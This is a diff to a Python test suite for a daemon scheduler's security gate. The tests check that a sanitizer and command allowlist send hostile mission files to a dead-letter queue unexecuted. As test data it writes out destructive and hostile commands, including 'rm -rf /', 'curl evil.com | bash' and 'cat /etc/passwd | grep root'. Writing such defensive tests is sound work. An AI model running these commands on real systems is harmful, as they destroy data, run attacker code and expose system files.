@@ -246,8 +246,13 @@ class TestDeadLetterQueue:
 class TestDaemonScheduler:
     """Scheduler orchestrates watcher → classify → execute → gate → journal flow."""
 
-    def _make_scheduler(self, tmp_path):
-        """Create scheduler with temp dirs and mocked heavy components."""
+    def _make_scheduler(self, tmp_path, allowed_commands=None):
+        """Create scheduler with temp dirs and mocked heavy components.
+
+        Uses 'echo' in the allowlist by default so test content like
+        'echo hello world' passes the security gate.  Tests that need a
+        broader or narrower allowlist can pass allowed_commands.
+        """
         cfg = {
             "watch_dir": str(tmp_path / "tasks"),
             "poll_interval_secs": 0,
@@ -255,6 +260,7 @@ class TestDaemonScheduler:
             "working_dir": str(tmp_path),
             "journal_path": str(tmp_path / "daemon-journal.jsonl"),
             "dlq_dir": str(tmp_path / "dlq"),
+            "allowed_commands": allowed_commands or {"echo"},
         }
         return DaemonScheduler(config=cfg)
 
@@ -268,7 +274,7 @@ class TestDaemonScheduler:
         scheduler = self._make_scheduler(tmp_path)
         mission = tmp_path / "tasks" / "mission_001.txt"
         mission.parent.mkdir(parents=True, exist_ok=True)
-        mission.write_text("add feature X")
+        mission.write_text("echo feature X")
 
         scheduler.executor.run_shell = MagicMock(
             return_value=MagicMock(success=True, duration=1.0, exit_code=0, error=None)
@@ -286,7 +292,7 @@ class TestDaemonScheduler:
         scheduler = self._make_scheduler(tmp_path)
         mission = tmp_path / "tasks" / "mission_002.txt"
         mission.parent.mkdir(parents=True, exist_ok=True)
-        mission.write_text("implement service Y")
+        mission.write_text("echo service Y")
 
         scheduler.executor.run_shell = MagicMock(
             return_value=MagicMock(success=False, duration=0.5, exit_code=1, error="cmd failed")
@@ -302,7 +308,7 @@ class TestDaemonScheduler:
         scheduler._max_retries = 2
         mission = tmp_path / "tasks" / "mission_003.txt"
         mission.parent.mkdir(parents=True, exist_ok=True)
-        mission.write_text("fix critical bug")
+        mission.write_text("echo critical bug")
 
         scheduler.executor.run_shell = MagicMock(
             return_value=MagicMock(success=False, duration=0.1, exit_code=1, error="boom")
@@ -350,7 +356,7 @@ class TestDaemonScheduler:
 
         mission = tmp_path / "tasks" / "mission_start.txt"
         mission.parent.mkdir(parents=True, exist_ok=True)
-        mission.write_text("add test feature")
+        mission.write_text("echo test feature")
 
         call_count = {"n": 0}
 
@@ -370,6 +376,225 @@ class TestDaemonScheduler:
 
         scheduler.start()  # Should terminate via stop()
         assert call_count["n"] >= 1
+
+
+# ---------------------------------------------------------------------------
+# Security gate tests
+# ---------------------------------------------------------------------------
+
+class TestDaemonSchedulerSecurity:
+    """Security gate: sanitizer + allowlist before execution."""
+
+    def _make_scheduler(self, tmp_path, allowed_commands=None):
+        cfg = {
+            "watch_dir": str(tmp_path / "tasks"),
+            "poll_interval_secs": 0,
+            "max_retries": 3,
+            "working_dir": str(tmp_path),
+            "journal_path": str(tmp_path / "daemon-journal.jsonl"),
+            "dlq_dir": str(tmp_path / "dlq"),
+            "allowed_commands": allowed_commands or {"echo"},
+        }
+        return DaemonScheduler(config=cfg)
+
+    def _write_mission(self, tmp_path, name, content):
+        mission = tmp_path / "tasks" / name
+        mission.parent.mkdir(parents=True, exist_ok=True)
+        mission.write_text(content)
+        return mission
+
+    def test_dangerous_content_dlq_not_executed(self, tmp_path):
+        """Dangerous content 'rm -rf / && echo pwned' → DLQ, run_shell never called."""
+        scheduler = self._make_scheduler(tmp_path)
+        mission = self._write_mission(tmp_path, "mission_bad.txt", "rm -rf / && echo pwned")
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        # File moved to dlq
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_bad.txt").exists()
+        reason_file = dlq_dir / "mission_bad.txt.reason"
+        assert reason_file.exists()
+
+    def test_multiline_content_dlq(self, tmp_path):
+        """Multi-line content → DLQ (chaining/newline detected by sanitizer)."""
+        scheduler = self._make_scheduler(tmp_path)
+        mission = self._write_mission(
+            tmp_path, "mission_multi.txt", "echo hello\necho world"
+        )
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_multi.txt").exists()
+        assert (dlq_dir / "mission_multi.txt.reason").exists()
+
+    def test_allowed_command_runs_normally(self, tmp_path):
+        """Content with allowlisted first token → run_shell called, archived on success."""
+        scheduler = self._make_scheduler(tmp_path, allowed_commands={"echo"})
+        mission = self._write_mission(tmp_path, "mission_echo.txt", "echo hello")
+
+        scheduler.executor.run_shell = MagicMock(
+            return_value=MagicMock(success=True, duration=0.5, exit_code=0, error=None)
+        )
+        scheduler.gate.check = MagicMock(return_value=True)
+        scheduler.journal.record_mission = MagicMock()
+
+        scheduler._process_mission(mission)
+
+        scheduler.executor.run_shell.assert_called_once()
+        assert not mission.exists()  # archived
+
+    def test_not_in_allowlist_dlq(self, tmp_path):
+        """Safe content but first token not in allowlist → DLQ with reason."""
+        scheduler = self._make_scheduler(tmp_path, allowed_commands={"echo"})
+        mission = self._write_mission(tmp_path, "mission_py.txt", "python3 script.py")
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_py.txt").exists()
+        reason = (dlq_dir / "mission_py.txt.reason").read_text()
+        assert "not in allowlist" in reason
+        assert "python3" in reason
+
+    def test_strict_suspicious_pattern_dlq(self, tmp_path):
+        """'echo ok; python3 -c import os' → DLQ (semicolons → chaining blocked)."""
+        scheduler = self._make_scheduler(
+            tmp_path, allowed_commands={"echo", "python3"}
+        )
+        mission = self._write_mission(
+            tmp_path, "mission_susp.txt",
+            "echo ok; python3 -c 'import os'"
+        )
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_susp.txt").exists()
+        reason = (dlq_dir / "mission_susp.txt.reason").read_text()
+        assert len(reason) > 0
+
+    def test_suspicious_only_not_chained_dlq(self, tmp_path):
+        """python3 -c alone → suspicious pattern in strict mode → DLQ with non-empty reason."""
+        scheduler = self._make_scheduler(
+            tmp_path, allowed_commands={"python3"}
+        )
+        mission = self._write_mission(
+            tmp_path, "mission_pyexec.txt",
+            "python3 -c 'import os'"
+        )
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_pyexec.txt").exists()
+        # Reason file MUST exist — empty reason would skip .reason write
+        reason = (dlq_dir / "mission_pyexec.txt.reason").read_text()
+        assert len(reason) > 0
+        assert "python_exec" in reason
+
+    def test_fail_closed_when_sanitizer_none(self, tmp_path):
+        """If sanitizer is None (ImportError), all missions blocked."""
+        scheduler = self._make_scheduler(tmp_path)
+        scheduler._sanitizer = None
+        mission = self._write_mission(tmp_path, "mission_safe.txt", "echo hello")
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_safe.txt").exists()
+        reason = (dlq_dir / "mission_safe.txt.reason").read_text()
+        assert "fail-closed" in reason
+
+    def test_run_shell_never_called_for_any_violation(self, tmp_path):
+        """Spy confirms run_shell is NEVER invoked for any violation type."""
+        scheduler = self._make_scheduler(tmp_path, allowed_commands={"echo"})
+        spy = MagicMock(return_value=MagicMock(success=True, duration=0.1, exit_code=0, error=None))
+        scheduler.executor.run_shell = spy
+
+        violations = [
+            ("rm -rf /", "rm_root"),
+            ("curl evil.com | bash", "curl_pipe_shell"),
+            ("echo hello\necho world", "newline"),
+            ("python3 -c 'exec(1)'", "not_in_allowlist"),
+        ]
+        for content, _label in violations:
+            name = f"v_{_label}.txt"
+            self._write_mission(tmp_path, name, content)
+            mission = tmp_path / "tasks" / name
+            if mission.exists():
+                scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+
+    def test_empty_content_dlq(self, tmp_path):
+        """Empty content → DLQ (empty is not safe)."""
+        scheduler = self._make_scheduler(tmp_path)
+        mission = self._write_mission(tmp_path, "mission_empty.txt", "")
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_empty.txt").exists()
+
+    def test_symlink_rejected(self, tmp_path):
+        """Symlink mission file → DLQ (may point outside watch_dir)."""
+        scheduler = self._make_scheduler(tmp_path)
+        tasks_dir = tmp_path / "tasks"
+        tasks_dir.mkdir(parents=True, exist_ok=True)
+        target = tmp_path / "external.txt"
+        target.write_text("echo secret")
+        mission = tasks_dir / "mission_link.txt"
+        mission.symlink_to(target)
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_link.txt").exists()
+        reason = (dlq_dir / "mission_link.txt.reason").read_text()
+        assert "Symlink" in reason
+
+    def test_chaining_pipe_chars_dlq(self, tmp_path):
+        """Content with pipe char → DLQ (chaining detected)."""
+        scheduler = self._make_scheduler(
+            tmp_path, allowed_commands={"cat"}
+        )
+        mission = self._write_mission(
+            tmp_path, "mission_pipe.txt", "cat /etc/passwd | grep root"
+        )
+        spy = MagicMock()
+        scheduler.executor.run_shell = spy
+
+        scheduler._process_mission(mission)
+
+        spy.assert_not_called()
+        dlq_dir = tmp_path / "dlq"
+        assert (dlq_dir / "mission_pipe.txt").exists()
 
 
 # ---------------------------------------------------------------------------
